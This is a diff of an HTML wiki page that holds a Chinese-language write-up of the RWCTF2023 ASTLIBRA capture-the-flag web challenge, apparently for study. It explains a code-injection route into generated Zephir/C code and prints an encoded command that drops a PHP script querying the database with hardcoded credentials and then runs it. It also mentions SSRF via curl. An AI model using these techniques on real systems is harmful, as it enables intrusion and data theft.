@@ -19,7 +19,7 @@
     
     
       
-        <title>RWCTF2023 ASTLIBRA - BRIdGE's wiki</title>
+        <title>RWCTF ASTLIBRA - BRIdGE's wiki</title>
       
     
     
@@ -66,11 +66,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#rwctf2023-astlibra" class="md-skip">
-          Skip to content
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              RWCTF2023 ASTLIBRA
+              RWCTF ASTLIBRA
             
           </span>
         </div>
@@ -640,50 +635,10 @@
       <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
       
       
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          RWCTF2023 ASTLIBRA
-          <span class="md-nav__icon md-icon"></span>
-        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        RWCTF2023 ASTLIBRA
+        RWCTF ASTLIBRA
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    复现
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    参考
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
       
     </li>
   
@@ -797,30 +752,6 @@
   
   
   
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    复现
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    参考
-  </a>
-  
-</li>
-      
-    </ul>
   
 </nav>
                   </div>
@@ -836,10 +767,8 @@
 
 
 
-<h1 id="rwctf2023-astlibra">RWCTF2023 ASTLIBRA</h1>
-<h2 id="_1">复现</h2>
 <p>环境和官方wp</p>
-<p><a href="https://github.com/wupco/rwctf2023-ASTLIBRA">https://github.com/wupco/rwctf2023-ASTLIBRA</a></p>
+<p>https://github.com/wupco/rwctf2023-ASTLIBRA</p>
 <p>当前端向/api.php发起请求的时候，api.php根据接收到的URL参数和用户名等信息，拼接出一段代码</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$tmpl = &lt;&lt;&lt;ZEPF</span>
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">namespace {namespace};</span>
@@ -881,8 +810,6 @@
 <blockquote>
 <p>Although cblock has been removed by <code>ASTLIBRA/zephir-tunnel/secure.patch</code>, it could still be inserted in the place out of the function scope.</p>
 </blockquote>
-<p>在docker中尝试编译一下就会发现确实可以。但是测试发现直接在zep代码末尾加system执行命令并不能在调用方法的时候执行。</p>
-<p><img alt="image-20230110185039304" src="https://s2.loli.net/2023/01/10/pv9wcjSmysdIbLD.png" /></p>
 <p>观察一下正常预编译后的C结构</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cp">#ifdef HAVE_CONFIG_H</span>
 <a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../ext_config.h&quot;</span>
@@ -974,9 +901,6 @@
 <p><code>echo PD9waHAKJGhvc3QgPSAnZGInOwokdXNlcm5hbWUgPSAncm9vdCc7CiRwYXNzd29yZCA9ICdyZWFsd29ybGRjdGYnOwokZGF0YWJhc2UgPSAnd2ViJzsKJGRiYyA9IG15c3FsaV9jb25uZWN0KCRob3N0LCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRhdGFiYXNlKTsKCiRxdWVyeSA9ICJzZWxlY3QgZmxhZyBmcm9tIGZsYWciOwp2YXJfZHVtcCgKICAgICRkYmMgLT4gcXVlcnkoJHF1ZXJ5KS0+ZmV0Y2hfYXNzb2MoKQopOwo=|base64 -d&gt;/tmp/flag.php&amp;&amp;php /tmp/flag.php&amp;&amp;rm /tmp/flag.php</code></p>
 <p><img alt="image-20230110190625158" src="https://s2.loli.net/2023/01/10/CidPIvysNxRXBTo.png" /></p>
 <p>另外，由于curl已经可以达到SSRF连数据库的效果，所以也不一定要命令执行，利用没有被ban的php-curl也可以直接返回flag。具体参见官方wp。</p>
-<h2 id="_2">参考</h2>
-<p><a href="https://github.com/wupco/rwctf2023-ASTLIBRA">https://github.com/wupco/rwctf2023-ASTLIBRA</a></p>
-<p>r3kapig's write-up</p>
 
 
 
